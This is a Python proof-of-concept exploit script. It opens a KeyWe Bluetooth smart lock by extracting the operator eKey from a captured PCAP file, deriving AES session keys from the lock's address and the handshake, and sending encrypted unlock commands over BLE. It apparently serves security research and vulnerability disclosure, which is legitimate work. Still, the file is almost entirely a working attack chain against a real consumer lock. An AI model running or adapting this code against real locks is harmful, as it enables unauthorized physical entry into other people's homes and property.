"""
Open the KeyWe Smart Lock based on a prerecorded
PCAP (pcapng) file
"""
#!/usr/bin/env python
from enum import Enum
import sys
import time

from helpers import print_ascii
from helpers import dump_hex

from pykeywe.cmd import DisconnectCmd
from pykeywe.cmd import DoorModeCmd
from pykeywe.cmd import DoorTimeSetCmd
from pykeywe.cmd import DoorUnlockCmd
from pykeywe.cmd import eKeyVerifyCmd
from pykeywe.cmd import WelcomeCmd

from pykeywe.keys import make_app_key
from pykeywe.keys import make_common_key
from pykeywe.keys import make_door_key

from Crypto.Cipher import AES
import pygatt    

adapter = pygatt.GATTToolBackend(hci_device='hci1')
common_crypt = None
door_crypt = None
app_crypt = None
device = None
has_hello = False

LOCK_BDADDR  = '8c:c8:f4:0f:eb:81'

OUTGOING_UUID = '50910002-c567-11e5-8822-0002a5d5c51b'
INCOMING_UUID = '50910003-c567-11e5-8822-0002a5d5c51b'

# an arbitrary value, let's set it zeroes
app_num = bytearray([0x00]*16)
msg_ctr = 0
door_num = None

def incoming_data_callback(handle, value):
    # yes, I know, I'm on the waitlist to the programmer hell
    # ...but I'm a lazy piece of work and this works :P
    global msg_ctr
    global app_num
    global door_num
    global has_hello
    global door_crypt
    global app_crypt

    pkt = bytes(value)

    print('KeyWe sent: {}'.format(
        dump_hex(
            pkt
        )
    ))
    if msg_ctr == 0:
        door_num = common_crypt.decrypt(pkt)
        print('Door num  : {}'.format(dump_hex(door_num)))
        decrypted = door_num
    else:
        if msg_ctr == 1:
            door_key = make_door_key(
                app_num,
                door_num
            )
            app_key = make_app_key(
                app_num,
                door_num
            )
            print('Door key  : {}'.format(dump_hex(door_key)))
            door_crypt = AES.new(
                door_key,
                AES.MODE_ECB
            )
            print('App key   : {}'.format(dump_hex(app_key)))
            app_crypt = AES.new(
                app_key,
                AES.MODE_ECB
            )
        decrypted = door_crypt.decrypt(pkt)
        
        if decrypted[:5] == b'Hello':
            has_hello = True

    print('Decrypted : {}'.format(
        dump_hex(
            decrypted
        )
    ))
    print_ascii(decrypted, '            ')
    msg_ctr += 1

if __name__ == '__main__':
    # load the PCAP capture filename
    fname = sys.argv[1]

    from decode_pcap import ekey_from_pcap
    # retrieve the operator password for the given BDADDR
    ekey = ekey_from_pcap(fname, LOCK_BDADDR)

    try:
        adapter.start()
        device = adapter.connect(LOCK_BDADDR)
        common_key = make_common_key(LOCK_BDADDR.encode('ascii'))

        print('App number: {}'.format(dump_hex(app_num)))
        print()

        print('Common Key: {}'.format(
            dump_hex(common_key)
        ))
        common_crypt = AES.new(
            common_key,
            AES.MODE_ECB
        )
        
        device.subscribe(
            INCOMING_UUID,
            callback=incoming_data_callback
        )
        device.char_write(
            OUTGOING_UUID,
            common_crypt.encrypt(bytes(app_num))
        )    # app num
        while True:
            if has_hello:                   # wait for a HELLO message to be received
                print('-> Welcome')         # respond with WELCOME
                device.char_write(
                    OUTGOING_UUID,
                    app_crypt.encrypt(bytes(WelcomeCmd()))
                )
                time.sleep(0.1)
                print('-> Door mode')       # set door mode
                device.char_write(
                    OUTGOING_UUID,
                    app_crypt.encrypt(bytes(DoorModeCmd(b'\x11')))
                ) 
                time.sleep(0.1)
                print('-> eKey Verify')     # verify operator password
                device.char_write(
                    OUTGOING_UUID,
                    app_crypt.encrypt(bytes(eKeyVerifyCmd(ekey)))
                )
                time.sleep(0.1)
                
                print('-> Door time set')   # set time (not sure if required)
                device.char_write(
                    OUTGOING_UUID,
                    app_crypt.encrypt(bytes(DoorTimeSetCmd()))
                )
                time.sleep(0.1)
                print('-> Door unlock')     # unlock the door right away
                device.char_write(
                    OUTGOING_UUID,
                    app_crypt.encrypt(bytes(DoorUnlockCmd(0)))
                )
                time.sleep(0.1)
                print('-> Disconnect')      # bye bye, lock o/
                device.char_write(
                    OUTGOING_UUID,
                    app_crypt.encrypt(bytes(DisconnectCmd()))
                )
                has_hello = False
                break                       # all is done, just quit
            time.sleep(0.2)
    finally:
        adapter.stop()
